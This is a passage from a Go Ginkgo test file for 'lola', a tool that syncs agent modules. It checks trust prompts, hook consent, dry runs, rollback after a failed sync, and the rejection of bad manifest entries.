			install(sc, engine.InstallRequest{Arg: notes}, engine.InstallRequest{Arg: gone})
			writeTree(notes, map[string]string{"commands/notes.md": "edited\n"})
			off := false
			entry := *loadManifest().Find("notes")
			entry.Rules = &off
			pull(manifest.Change{Set: []manifest.Entry{entry}, Remove: []string{"gone"}})
			no := func(rs []engine.Removal) (bool, error) { return false, nil }

			_, err := sync(engine.SyncRequest{Trust: yes, ConfirmRemovals: no})
			declined, ok := errors.AsType[*engine.RemovalsDeclinedError](err)
			Expect(ok).To(BeTrue())
			Expect(*declined).To(Equal(engine.RemovalsDeclinedError{Recorded: true, Again: []string{"notes"}, Retry: "lola sync --project"}),
				"render still leaves notes out: its content changed, so the next sync asks about it again")
		})

		It("says a covered folder lola never installed is not installed yet, as an addition", func() {
			gone := folder("gone", nil)
			install(sc, engine.InstallRequest{Arg: gone})
			folder("fresh", nil)
			pull(manifest.Change{Set: []manifest.Entry{{Name: "fresh", Source: "mods/fresh"}}, Remove: []string{"gone"}})
			no := func(rs []engine.Removal) (bool, error) { return false, nil }
			_, err := sync(engine.SyncRequest{Trust: yes, ConfirmRemovals: no})
			_, ok := errors.AsType[*engine.RemovalsDeclinedError](err)
			Expect(ok).To(BeTrue())
			Expect(lockFile().Modules).NotTo(HaveKey("fresh"), "the removals No installed nothing")
			Expect(covered()).To(BeTrue())

			_, err = sync(engine.SyncRequest{Modules: []string{"fresh"}})
			refusal, isRefusal := errors.AsType[*engine.TrustRefusalError](err)
			Expect(isRefusal).To(BeTrue(), "%v", err)
			Expect(refusal.Report.Changes).To(HaveExactElements(And(HaveField("Module", "fresh"), HaveField("Kind", "added"),
				HaveField("Reason", "not installed yet"))))
		})

		It("a No to removals does not claim render installs a changed folder the run left out", func() {
			a, notes, gone := folder("a", nil), folder("notes", nil), folder("gone", nil)
			install(sc, engine.InstallRequest{Arg: a}, engine.InstallRequest{Arg: notes}, engine.InstallRequest{Arg: gone})
			writeTree(a, map[string]string{"commands/a.md": "edited\n"})
			writeTree(notes, map[string]string{"commands/notes.md": "edited\n"})
			pull(manifest.Change{Targets: []string{"claude-code", "opencode"}, Remove: []string{"gone"}})
			no := func(rs []engine.Removal) (bool, error) { return false, nil }

			_, err := sync(engine.SyncRequest{Trust: only("a", "gone"), ConfirmRemovals: no})
			declined, ok := errors.AsType[*engine.RemovalsDeclinedError](err)
			Expect(ok).To(BeTrue())
			Expect(*declined).To(Equal(engine.RemovalsDeclinedError{Recorded: true, Again: []string{"a"}, Retry: "lola sync --project"}),
				"render leaves a and notes out: their content changed; the next sync asks about the accepted a again")
		})

		It("a declined entry's hooks are neither asked about, recorded nor run", func() {
			marker := filepath.Join(tmp, "ran")
			folder("hooked", map[string]string{
				"lola.yml":               "name: hooked\nhooks: {post-install: hooks/post.sh}\n",
				"hooks/post.sh":          "#!/bin/sh\ntouch " + marker + "\n",
				"skills/review/SKILL.md": "---\ndescription: Review\nhooks: {Stop: [{hooks: [{type: command, command: ./stop.sh}]}]}\n---\nR.\n"})
			Expect(os.Chmod(filepath.Join(proj, "mods", "hooked", "hooks", "post.sh"), 0o755)).To(Succeed())
			folder("plain", nil)
			install(sc, engine.InstallRequest{Arg: src})
			pull(manifest.Change{Set: []manifest.Entry{{Name: "hooked", Source: "mods/hooked"}, {Name: "plain", Source: "mods/plain"}}})
			opts := engine.Options{
				Ask: func(m string, _ []engine.HookScript) (bool, error) {
					Fail("asked install hook consent for " + m)
					return false, nil
				},
				AskRuntimeHooks: func(m string, _ []engine.RuntimeHook) (bool, error) {
					Fail("offered runtime hooks of " + m)
					return false, nil
				},
			}
			_, err := sync(engine.SyncRequest{Trust: only("plain"), ConfirmRemovals: confirm, Options: opts})
			Expect(err).NotTo(HaveOccurred())
			Expect(asked[0].Changes).To(ContainElement(And(HaveField("Module", "hooked"), HaveField("Hooks", Not(BeEmpty())))),
				"the diff showed its hooks")
			Expect(marker).NotTo(BeAnExistingFile(), "its hook never ran")
			Expect(p.Consent).NotTo(BeAnExistingFile(), "no consent recorded for it")
			Expect(read(".claude/commands/plain.md")).To(Equal("plain\n"))
		})
	})

	Describe("dry runs and failures", func() {
		cacheNames := func() []string {
			GinkgoHelper()
			names, err := e.Store.Names()
			Expect(err).NotTo(HaveOccurred())
			return names
		}
		staged := func() []os.DirEntry {
			GinkgoHelper()
			entries, err := os.ReadDir(p.Staging)
			Expect(err).NotTo(HaveOccurred())
			return entries
		}

		It("an untrusted project.yml is never cached without trust", func() {
			entry := pinFor("v1")
			Expect(e.Store.Remove("example")).To(BeTrue())
			// A fresh clone: project.yml from someone else, no trust record, nothing cached.
			writeTree(filepath.Join(proj, ".lola"), map[string]string{"project.yml": "version: 1\ntargets: [claude-code]\nmodules:\n" +
				"  - name: example\n    source: " + url + "\n    ref: v1\n    commit: " + entry.Commit + "\n    digest: " + entry.Digest + "\n"})
			before := state()

			_, err := sync(engine.SyncRequest{ConfirmRemovals: confirm})
			Expect(err).To(MatchError("lola sync needs your trust for .lola/project.yml, which has not been trusted on this machine, " +
				"and there is no terminal to ask on; -y confirms removals only; accept them with --trust=entries"))
			Expect(state()).To(Equal(before))

			res, err := sync(engine.SyncRequest{Options: engine.Options{DryRun: true}})
			Expect(err).NotTo(HaveOccurred())
			Expect(res.Trust.Status).To(Equal("new"))
			Expect(res.Trust.Recorded).To(BeFalse())
			Expect(res.Trust.Changes).To(HaveExactElements(And(HaveField("Module", "example"),
				HaveField("Files", ContainElement(engine.FileChange{Path: "commands/ship.md", Change: "added"})),
				HaveField("MCPServers", ContainElement(HaveField("Name", "lola-gh"))))))
			Expect(res.Steps).NotTo(BeEmpty(), "the plan is shown")
			Expect(cacheNames()).To(BeEmpty(), "no name, version or head in the cache")
			Expect(staged()).To(BeEmpty(), "the run's staging is removed")
			Expect(state()).To(Equal(before), "nothing written to the project or the trust record")
		})

		It("a dry run writes nothing to the project, its manifest or the trust record", func() {
			install(sc, engine.InstallRequest{Arg: src}, engine.InstallRequest{Arg: url, Ref: "main"})
			push(map[string]string{"commands/ship.md": "Ship v2\n"})
			writeTree(filepath.Join(proj, "mods", "kit"), map[string]string{"lola.yml": "name: kit\n", "commands/fix.md": "Fix.\n"})
			pull(manifest.Change{Set: []manifest.Entry{{Name: "kit", Source: "mods/kit"}}, Remove: []string{"other"}})
			before := state()
			res, err := sync(engine.SyncRequest{Update: true, Options: engine.Options{DryRun: true}})
			Expect(err).NotTo(HaveOccurred())
			Expect(res.DryRun).To(BeTrue())
			Expect(res.Pins).To(ContainElement(And(HaveField("Module", "example"), HaveField("Reason", engine.PinUpdate), HaveField("Written", false))))
			Expect(res.Removals).To(ContainElement(HaveField("Module", "other")))
			Expect(state()).To(Equal(before))
			Expect(staged()).To(BeEmpty())

			// --update of an entry whose ref serves its pin again, while the cache's head for the
			// ref is another version: the dry run leaves the head where it is (§3.1).
			pinnedCommit := lockFile().Modules["example"].Commit
			_, err = e.Update(ctx, nil)
			Expect(err).NotTo(HaveOccurred())
			head, _, err := e.Store.Head("example", "main")
			Expect(err).NotTo(HaveOccurred())
			Expect(head.Commit).NotTo(Equal(pinnedCommit))
			gitIn(work, "reset", "-q", "--hard", pinnedCommit)
			gitIn(work, "push", "-q", "-f", "--all", bare)
			before = state()
			res, err = sync(engine.SyncRequest{Modules: []string{"example"}, Update: true, Options: engine.Options{DryRun: true}})
			Expect(err).NotTo(HaveOccurred())
			Expect(res.Pins).To(BeEmpty(), "the fetch matched the pin")
			after, _, err := e.Store.Head("example", "main")
			Expect(err).NotTo(HaveOccurred())
			Expect(after.Commit).To(Equal(head.Commit), "a project dry run moves no head")
			Expect(state()).To(Equal(before))
		})

		It("--update -n at user scope fetches into the cache and moves heads, and writes nothing else", func() {
			user := engine.Scope{Kind: target.User}
			install(user, engine.InstallRequest{Arg: url, Ref: "main"})
			pinned, err := e.Manifest(user)
			Expect(err).NotTo(HaveOccurred())
			commit := push(map[string]string{"commands/ship.md": "Ship v2\n"})
			userYML, err := os.ReadFile(p.UserManifest)
			Expect(err).NotTo(HaveOccurred())

			res, err := sync(engine.SyncRequest{Scope: user, Update: true, Options: engine.Options{DryRun: true}})
			Expect(err).NotTo(HaveOccurred())
			Expect(res.Pins).To(HaveExactElements(And(HaveField("Commit", commit), HaveField("Written", false),
				HaveField("PreviousDigest", pinned.Find("example").Digest))))
			Expect(res.Trust.Status).To(Equal(engine.TrustStatusNotApplicable))
			head, _, err := e.Store.Head("example", "main")
			Expect(err).NotTo(HaveOccurred())
			Expect(head.Commit).To(Equal(commit), "the head moved")
			Expect(os.ReadFile(p.UserManifest)).To(Equal(userYML))
			b, err := os.ReadFile(filepath.Join(p.Home, ".claude", "commands", "ship.md"))
			Expect(err).NotTo(HaveOccurred())
			Expect(string(b)).To(Equal("Ship $ARGUMENTS\n"))
		})

		It("keeps only the trusted content it fetched when the trust question is declined", func() {
			install(sc, engine.InstallRequest{Arg: url, Ref: "v1"})
			Expect(e.Store.Remove("example")).To(BeTrue())
			kit := filepath.Join(proj, "mods", "kit")
			writeTree(kit, map[string]string{"lola.yml": "name: kit\n", "commands/fix.md": "Fix.\n"})
			pull(manifest.Change{Set: []manifest.Entry{{Name: "kit", Source: "mods/kit"}}})
			_, err := sync(engine.SyncRequest{Trust: func(engine.TrustReport) (engine.TrustAnswer, error) { return engine.TrustAnswer{}, nil }})
			Expect(err).To(MatchError(engine.ErrDeclined))
			Expect(cacheNames()).To(Equal([]string{"example"}), "the covered entry at its pin is cached, the pulled one is not")
			Expect(staged()).To(BeEmpty())
		})

		It("leaves the project and the record unchanged when a publish is refused under the cache lock", func() {
			install(sc, engine.InstallRequest{Arg: src})
			kit := filepath.Join(proj, "mods", "kit")
			writeTree(kit, map[string]string{"lola.yml": "name: kit\n", "commands/fix.md": "Fix.\n"})
			elsewhere := filepath.Join(tmp, "elsewhere", "kit")
			writeTree(elsewhere, map[string]string{"lola.yml": "name: kit\n", "commands/fix.md": "Other.\n"})
			pull(manifest.Change{Set: []manifest.Entry{{Name: "kit", Source: "mods/kit"}}})
			project := func() map[string]string {
				GinkgoHelper()
				out := state()
				maps.DeleteFunc(out, func(k, _ string) bool { return strings.HasPrefix(k, filepath.Dir(p.Store)) })
				return out
			}
			before := project()
			_, err := sync(engine.SyncRequest{Trust: func(engine.TrustReport) (engine.TrustAnswer, error) {
				// Another lola caches the name from another source while this one asks.
				spec, ok, err := source.Parse(elsewhere, "/")
				Expect(err).NotTo(HaveOccurred())
				Expect(ok).To(BeTrue())
				_, err = e.Fetch(ctx, spec)
				return engine.TrustAnswer{All: true}, err
			}})
			Expect(err).To(MatchError(ContainSubstring(`a different module named "kit" is already in your cache`)))
			Expect(project()).To(Equal(before))
			r, err := e.Trust.Load(proj)
			Expect(err).NotTo(HaveOccurred())
			Expect(r.View.Find("kit")).To(BeNil(), "nothing was recorded")
		})

		It("-y and --trust never grant hook consent", func() {
			install(sc, engine.InstallRequest{Arg: src})
			kit := filepath.Join(proj, "mods", "kit")
			writeTree(kit, map[string]string{"lola.yml": "name: kit\nhooks: {pre-install: hooks/pre.sh}\n", "hooks/pre.sh": "#!/bin/sh\nexit 0\n",
				"commands/fix.md": "Fix.\n"})
			Expect(os.Chmod(filepath.Join(kit, "hooks", "pre.sh"), 0o755)).To(Succeed())
			pull(manifest.Change{Set: []manifest.Entry{{Name: "kit", Source: "mods/kit"}}})
			_, err := sync(engine.SyncRequest{Trust: yes, ConfirmRemovals: confirm})
			Expect(err).To(MatchError("kit has a pre-install hook, and lola runs hooks only with your consent"))
			Expect(p.Consent).NotTo(BeAnExistingFile())
			Expect(filepath.Join(proj, ".claude", "commands", "fix.md")).NotTo(BeAnExistingFile())

			writeTree(kit, map[string]string{"lola.yml": "name: kit\n",
				"skills/review/SKILL.md": "---\ndescription: Review\nhooks: {Stop: [{hooks: [{type: command, command: ./stop.sh}]}]}\n---\nR.\n"})
			res, err := sync(engine.SyncRequest{Trust: yes, ConfirmRemovals: confirm})
			Expect(err).NotTo(HaveOccurred())
			kitResult := res.Modules[slices.IndexFunc(res.Modules, func(m engine.ModuleResult) bool { return m.Name == "kit" })]
			Expect(kitResult.RuntimeHooks).NotTo(BeEmpty())
			Expect(kitResult.RuntimeHooks).To(HaveEach(HaveField("Status", engine.RuntimeHooksDeclined)))
			Expect(p.Consent).NotTo(BeAnExistingFile())
		})

		It("a failed sync leaves the project as it was", func() {
			if os.Geteuid() == 0 {
				Skip("root ignores directory permissions")
			}
			// A failing pre-install hook, with consent: the copies, files, ledger and manifest are
			// restored.
			kit := filepath.Join(proj, "mods", "kit")
			writeTree(kit, map[string]string{"lola.yml": "name: kit\nhooks: {pre-install: hooks/pre.sh}\n", "hooks/pre.sh": "#!/bin/sh\nexit 0\n",
				"commands/fix.md": "Fix.\n"})
			Expect(os.Chmod(filepath.Join(kit, "hooks", "pre.sh"), 0o755)).To(Succeed())
			allow := engine.Options{Trust: engine.TrustHooks}
			_, err := e.Install(ctx, sc, proj, []engine.InstallRequest{{Arg: kit}}, engine.Options{Targets: claude.Targets, Trust: engine.TrustHooks})
			Expect(err).NotTo(HaveOccurred())
			pull(manifest.Change{Set: []manifest.Entry{{Name: "example", Source: url, Ref: "v1"}}}) // a pin to write
			writeTree(kit, map[string]string{"commands/fix.md": "Fix v2.\n", "hooks/pre.sh": "#!/bin/sh\nexit 3\n"})
			before := state()
			_, err = sync(engine.SyncRequest{Trust: yes, Options: allow})
			Expect(err).To(MatchError(ContainSubstring("pre-install hook hooks/pre.sh of kit failed")))
			after := state()
			maps.DeleteFunc(after, func(k, _ string) bool { return strings.HasPrefix(k, filepath.Dir(p.Store)) })
			maps.DeleteFunc(before, func(k, _ string) bool { return strings.HasPrefix(k, filepath.Dir(p.Store)) })
			// --trust=hooks recorded its consent once the receipt was answered, before the hook ran
			// (Plan 9 R-9-3): consent is state, not the project's.
			Expect(after[p.Consent]).NotTo(Equal(before[p.Consent]))
			delete(after, p.Consent)
			delete(before, p.Consent)
			Expect(after).To(Equal(before))

			// A manifest rename that fails inside plan.Apply, after the files and the ledger: user.yml
			// links into a directory lola cannot write.
			user := engine.Scope{Kind: target.User}
			shared := filepath.Join(tmp, "shared")
			writeTree(shared, map[string]string{"user.yml": "version: 1\ntargets: [claude-code]\nmodules:\n  - name: example\n    source: " + url + "\n    ref: v1\n"})
			Expect(os.MkdirAll(filepath.Dir(p.UserManifest), 0o700)).To(Succeed())
			Expect(os.Symlink(filepath.Join(shared, "user.yml"), p.UserManifest)).To(Succeed())
			Expect(os.Chmod(shared, 0o555)).To(Succeed())
			DeferCleanup(os.Chmod, shared, os.FileMode(0o755))
			userRoots := []string{p.Home, p.ConfigHome, p.StateHome, shared, filepath.Join(p.DataHome, "lola", "user-modules")}
			snapshot := func() map[string]string {
				GinkgoHelper()
				out := map[string]string{}
				for _, root := range userRoots {
					Expect(filepath.WalkDir(root, func(path string, d os.DirEntry, err error) error {
						if errors.Is(err, os.ErrNotExist) && path == root {
							return filepath.SkipDir
						}
						if err != nil || d.IsDir() || path == p.UserLock || strings.Contains(path, string(filepath.Separator)+"locks"+string(filepath.Separator)) {
							return err
						}
						if d.Type()&os.ModeSymlink != 0 {
							l, err := os.Readlink(path)
							out[path] = "-> " + l
							return err
						}
						b, err := os.ReadFile(path)
						out[path] = string(b)
						return err
					})).To(Succeed())
				}
				return out
			}
			before = snapshot()
			_, err = sync(engine.SyncRequest{Scope: user})
			Expect(err).To(MatchError(ContainSubstring("permission denied")))
			Expect(snapshot()).To(Equal(before))
		})
	})

	Describe("refuses before any network contact", func() {
		It("a home directory as a project", func() {
			_, err := sync(engine.SyncRequest{Scope: engine.Scope{Kind: target.Project, ProjectDir: p.Home}})
			Expect(err).To(MatchError(ContainSubstring("is your home directory, where the user scope installs")))
			Expect(errs.Hints(err)).To(ContainElement("sync the user scope: lola sync --user"))
		})

		It("a scope without a manifest, creating nothing", func() {
			_, err := sync(engine.SyncRequest{})
			Expect(err).To(MatchError("no project.yml in " + proj))
			Expect(errs.Hints(err)).To(ContainElement("start one: lola install --project <source>"))
			Expect(os.ReadDir(proj)).To(BeEmpty(), "no .lola/ is left behind")
			_, err = sync(engine.SyncRequest{Scope: engine.Scope{Kind: target.User}})
			Expect(err).To(MatchError("no user.yml at " + p.UserManifest))
		})

		It("the cache's other source for a name is refused before any fetch", func() {
			folder := filepath.Join(tmp, "elsewhere", "example")
			writeTree(folder, exampleModule)
			install(sc, engine.InstallRequest{Arg: folder})
			Expect(e.Store.Remove("example")).To(BeTrue())
			install(engine.Scope{Kind: target.User}, engine.InstallRequest{Arg: url})
			requests.Store(0)
			before := state()

			for _, dry := range []bool{false, true} {
				_, err := sync(engine.SyncRequest{Options: engine.Options{DryRun: dry}})
				Expect(err).To(MatchError("example in your cache comes from " + url + ", and project.yml asks for " + folder +
					"; the cache is shared by every project on this machine"))
				Expect(errs.Hints(err)).To(Equal([]string{"remove it from your cache: lola cache rm example (add -y off a terminal)", "then: lola sync --project"}))
			}
			Expect(requests.Load()).To(BeZero())
			Expect(state()).To(Equal(before))
		})

		It("a pulled folder source moved to another folder", func() {
			a, b := filepath.Join(tmp, "a", "example"), filepath.Join(tmp, "b", "example")
			writeTree(a, exampleModule)
			writeTree(b, exampleModule)
			install(sc, engine.InstallRequest{Arg: a})
			manPath := filepath.Join(proj, ".lola", "project.yml")
			man, err := os.ReadFile(manPath)
			Expect(err).NotTo(HaveOccurred())
			moved := strings.Replace(string(man), a, b, 1)
			Expect(moved).NotTo(Equal(string(man)))
			Expect(os.WriteFile(manPath, []byte(moved), 0o600)).To(Succeed())
			before := state()

			_, err = sync(engine.SyncRequest{})
			Expect(err).To(MatchError("example in your cache comes from " + a + ", and project.yml asks for " + b +
				"; the cache is shared by every project on this machine"))
			Expect(errs.Hints(err)).To(Equal([]string{"remove it from your cache: lola cache rm example (add -y off a terminal)", "then: lola sync --project"}))
			Expect(state()).To(Equal(before))
		})

		It("an entry whose pin or ref does not fit its source, or whose targets are unusable", func() {
			archive := filepath.Join(tmp, "example.tgz")
			Expect(os.WriteFile(archive, tarGz("example", exampleModule), 0o644)).To(Succeed())
			install(sc, engine.InstallRequest{Arg: src})
			manPath := filepath.Join(proj, ".lola", "project.yml")
			good, err := os.ReadFile(manPath)
			Expect(err).NotTo(HaveOccurred())
			digest := "sha256:" + strings.Repeat("a", 64)
			for _, c := range []struct{ entry, want, hint string }{
				{"source: ../src/other\n    ref: v1", "other: its source is a folder, which has no ref", "drop ref from its entry in project.yml"},
				{"source: " + archive + "\n    digest: " + digest + "\n    commit: " + strings.Repeat("c", 40),
					"commit is recorded only for a git source", ""},
				{"source: " + url + "\n    digest: " + digest, "other: its digest is pinned without the commit it came from",
					"re-pin it: lola sync --project --update other"},
				{"source: ../src/other\n    targets: [nope]", `other: unknown target "nope"`, "valid targets: "},
				{"source: ./missing", "other: ./missing is not a source; sources are " + source.AcceptedForms, ""},
			} {
				Expect(os.WriteFile(manPath, []byte("version: 1\ntargets: [claude-code]\nmodules:\n  - name: other\n    "+c.entry+"\n"), 0o600)).To(Succeed())
				requests.Store(0)
				_, err := sync(engine.SyncRequest{})
				Expect(err).To(MatchError(ContainSubstring(c.want)), c.entry)
				if c.hint != "" {
					Expect(errs.Hints(err)).To(ContainElement(ContainSubstring(c.hint)), c.entry)
				}
				Expect(requests.Load()).To(BeZero(), c.entry)
			}
			Expect(os.WriteFile(manPath, []byte("version: 1\nmodules:\n  - name: other\n    source: ../src/other\n"), 0o600)).To(Succeed())
			_, err = sync(engine.SyncRequest{})
			Expect(err).To(MatchError("other: project.yml gives it no targets"))
			Expect(os.WriteFile(manPath, good, 0o600)).To(Succeed())
			_, err = sync(engine.SyncRequest{Modules: []string{"nope"}, Update: true})
			Expect(err).To(MatchError("nope is neither in project.yml nor installed here"))
			Expect(errs.Hints(err)).To(Equal([]string{"modules in project.yml: other"}))
		})
	})
})
